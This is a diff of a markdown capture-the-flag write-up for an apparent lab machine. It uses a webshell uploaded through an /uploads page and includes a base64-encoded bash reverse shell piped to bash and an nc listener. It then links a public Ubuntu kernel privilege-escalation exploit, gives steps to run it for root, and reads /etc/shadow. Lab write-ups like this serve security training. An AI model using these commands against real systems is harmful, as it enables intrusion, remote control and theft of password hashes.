@@ -281,22 +281,13 @@ dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt
 * /l
 * /m
 * /u
-* /uploads
+* **/uploads**
 * /vendor
 * /w
 
-
+Uploads subpage is important for us. When we upload a file, we can access it via 10.10.11.241:8080/uploads/\<file>
 
 ### Exploitation
-
-#### Reverse Shell crafting
-
-`sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`
-
-* base64 encode
-  * `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE=`
-* whole command for webshell
-  * `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
 
 #### p0wnyshell Tool
 
@@ -311,6 +302,16 @@ dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt
 
     <figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption><p>10.10.11.241:8080/uploads/shell.phar</p></figcaption></figure>
 
+#### Reverse Shell crafting
+
+`sh -i >& /dev/tcp/<IP>/<PORT> 0>&1`
+
+* base64 encode
+  * `c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE=`
+* whole command for webshell
+  * `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
+  * we dont have permissions to directly start sh command, but we can echo it under base64
+
 `echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTAuMTQuMy80NDQ0IDA+JjE= | base64 -d | bash`
 
 `nc -nlvp 4444`
@@ -323,6 +324,16 @@ dirb http://10.10.11.241:8080/ /usr/share/wordlists/dirb/common.txt
 `There is a user drwilliams`
 
 `/etc/shadow`
+
+* we dont have permissions to read shadow file
+  * uname -r
+    * Ubuntu (Linux) v5.19
+      * EXPLOIT: [https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629](https://github.com/g1vi/CVE-2023-2640-CVE-2023-32629)
+        * upload this sh file into reverse shell
+        * chmod u+x
+        * run (./exploit.sh)
+        * we obtained root privileges
+* cat /etc/shadow
 
 <figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
 
